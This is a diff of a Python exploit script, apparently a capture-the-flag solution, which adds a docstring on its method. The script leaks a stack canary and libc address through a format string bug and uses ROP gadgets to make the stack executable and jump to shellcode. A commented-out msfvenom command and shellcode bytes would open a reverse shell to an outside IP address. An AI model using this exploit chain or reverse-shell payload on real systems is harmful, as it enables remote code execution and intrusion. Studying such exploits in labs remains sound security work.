@@ -45,7 +45,6 @@ if __name__ == "__main__":
     prdx = libc.address + 0x0000000000001b96# pop rdx; ret;
     jrsp = libc.address + 0x0000000000002b1d# jmp rsp;
 
-    # Honestly, I've no idea why reverse_tcp failed. I guess it stucks in requests.get. Please kindly let me know if you know the answer.
     # msfvenom -p linux/x64/shell/reverse_tcp LHOST=123.207.141.87 LPORT=12345 -f python -v sc
     #  sc =  ""
     #  sc += "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d"
@@ -80,3 +79,9 @@ if __name__ == "__main__":
     #  raw_input("DEBUG: ")
     rop(payload)
     success("DONE")
+'''
+1. leak canary, stack address and libc.address using format string bug in router();
+2. with known canary and libc.address, we're able to ROP.
+3. I just want to send my payload using requests.get(), so I make a mprotect(stack, 0x1000, 7) and using rop then jump to my shellcode.
+However, I've no idea why reverse_tcp shellcode failed. I guess it stucks in requests.get. Please kindly let me know if you know the answer.
+'''
